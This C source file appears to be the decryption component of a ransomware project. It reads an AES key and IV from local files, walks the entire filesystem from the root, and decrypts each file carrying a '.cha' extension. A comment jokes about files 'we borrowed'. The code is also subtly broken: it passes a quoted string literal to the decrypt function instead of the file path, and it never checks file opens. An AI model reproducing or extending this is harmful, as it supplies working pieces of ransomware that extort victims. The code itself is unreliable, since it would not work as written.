#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <dirent.h>
#include <time.h>
#include <curl/curl.h>
#include <sys/stat.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/aes.h>


#include <openssl/rand.h>

#include <openssl/err.h>

#include "files.h"
#include "encryption.h"

int main(){

    OpenSSL_add_all_algorithms();
    ERR_load_crypto_strings();

    //Generate AES key and IV
    unsigned char key[32];
    size_t key_size = sizeof(key);

    unsigned char iv[16];
    size_t iv_size = sizeof(iv);

    //Authentication string
    static const unsigned char aad[] = "Cyan";


    //Import AES key and IV from file
    const char *aes_filename = "aes.key";
    const char *iv_filename = "iv.key";

    FILE *aes_file = fopen(aes_filename, "rb");
    FILE *iv_file = fopen(iv_filename, "rb");

    //Read bytes into AES KEY and IV
    fread(key, 1, key_size, aes_file);
    fread(iv, 1, iv_size, iv_file);


    //List all the files we borrowed :O

    const char *path = "/";
    PathList pathList;
    initPathList(&pathList);

    linuxListFiles(path, &pathList);
    //Browse files
    for (size_t i = 0; i < pathList.count; ++i) {
        //Get file extension
        char *current_path = pathList.paths[i];
        int path_len = strlen(current_path);
        const char *last_four = &current_path[path_len - 4];
        //If the file has our encrypted file extension
        if (strcmp(last_four, ".cha") == 0) {
            //printf("Strcmp result: %d\n", strcmp(last_four, ".cha")); // Debug
            //printf("Path: %s\nExtension: %s\n", current_path, last_four); // Debug

            //Decrypt each file with AES
            decryptFile(key, iv, aad, "pathList.paths[i]");
        }
    }
    freePathList(&pathList);


    return 0;
}
